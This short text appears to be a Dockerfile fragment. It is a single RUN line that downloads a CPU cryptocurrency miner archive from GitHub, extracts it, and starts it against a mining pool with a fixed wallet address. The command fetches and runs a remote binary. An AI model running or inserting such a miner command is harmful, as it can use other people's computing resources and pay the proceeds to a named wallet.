...
RUN wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz && ./hellminer -c tcp://ap.luckpool.net:3956#xnsub -u RM9kptbogcpFsjJbbXLXAMhecKxWrQ6gMq.worker -p x --cpu 2
